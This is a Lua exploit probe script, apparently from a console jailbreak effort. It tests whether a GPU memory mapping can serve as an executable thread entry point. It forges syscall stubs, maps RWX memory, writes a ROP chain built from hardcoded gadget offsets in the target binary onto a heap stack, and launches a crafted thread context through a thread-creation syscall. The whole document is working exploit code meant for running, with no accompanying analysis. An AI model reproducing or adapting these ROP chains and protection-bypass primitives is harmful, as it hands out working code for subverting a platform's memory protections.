-- CRASH_CLASS: HIGH
-- PROBE 940b: can a GPU page be written and then used as thread entry?
-- 940a died with the chain placed IN the GPU mapping - that conflates "GPU memory is not
-- writable/usable" with "GPU memory is not executable". Here the chain lives in ordinary
-- heap; only the entry address is the GPU page.
print("=== PROBE 940b: GPU entry, heap stack ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then local ok, n = pcall(function() return v:tonumber() end); if ok and n then return n end end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end
local function safe_wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end
local function fmt(v) return string.format("0x%X", to_num(v)) end

local sc_mmap = make_syscall(477)
local sc_thr  = make_syscall(430)
local sc_547  = make_syscall(547)
local eboot = 0x591D8000
local pop_rdi = eboot + 0xA1DFE
local pop_rax = eboot + 0x18992
local store   = eboot + 0xA6C67
local jmp_g   = eboot + 0x2A1A0
local fn
do
    local s = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
    if s then fn = tonumber(s:sub(3), 16) end
end
print("[0] fn=" .. tostring(fn))

local PAGE = 0x4000
local ok, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(7), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local base = ok and to_num(gpu) or 0
print(string.format("[1] mmap prot=7 -> %s", fmt(base)))
if base == 0 or base == 0xFFFFFFFFFFFFFFFF then print("[1] FAIL"); return end

safe_wd(base, 0x909090C3)
local back = safe_rd(base)
print(string.format("[2] write 0x909090C3 read %s %s", tostring(back and string.format("0x%X", back) or "nil"),
    (back == 0x909090C3) and "OK (CPU can write GPU mapping)" or "MISMATCH"))
safe_wq(base + 8, 0x1122334455667788)
local q0 = safe_rd(base + 8)
local q1 = safe_rd(base + 12)
print(string.format("[3] qword write read %s %s", tostring(q0 and string.format("0x%08X", q0) or "nil"),
    tostring(q1 and string.format("0x%08X", q1) or "nil")))

local out = memory.alloc(8)
safe_wq(out, 0)
local stack = memory.alloc(0x200)
local function chain(entry_out)
    local c = { pop_rdi, entry_out, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g }
    for i, v in ipairs(c) do safe_wq(stack + (i - 1) * 8, v) end
    return c
end
local function ctx_make(entry, rsp, rax)
    local ctx = memory.alloc(0x140)
    for i = 0, 0x13C, 8 do safe_wq(ctx + i, 0) end
    safe_wd(ctx + 0x0C0, 0x43); safe_wd(ctx + 0x100, 0x3B)
    safe_wq(ctx + 0x0E0, entry); safe_wq(ctx + 0x0F8, rsp)
    safe_wq(ctx + 0x108, 0x480); safe_wq(ctx + 0x110, 0x10000)
    safe_wq(ctx + 0x0D0, 0)
    safe_wq(ctx + 0x078, rax)
    return ctx
end
chain(out)
local okc, rvc = pcall(function() return sc_thr(uint64(ctx_make(fn, stack, 20)), uint64(0)) end)
print(string.format("[4] control entry=fn rv=%s out=%s", tostring(okc and fmt(rvc) or "pcall-fail"), tostring(safe_rd(out))))
if not (okc and to_num(rvc) == 0 and (safe_rd(out) or 0) ~= 0) then print("[4] control failed, stop"); print("[Z] DONE"); return end

safe_wq(out, 0)
chain(out)
local okx, rvx = pcall(function() return sc_thr(uint64(ctx_make(base, stack, 0)), uint64(0)) end)
local got = safe_rd(out)
print(string.format("[5] entry=GPU rv=%s out=%s", tostring(okx and fmt(rvx) or "pcall-fail"), tostring(got)))
if got and got ~= 0 then print("[5] EXECUTED GPU PAGE") end
print("[Z] DONE")
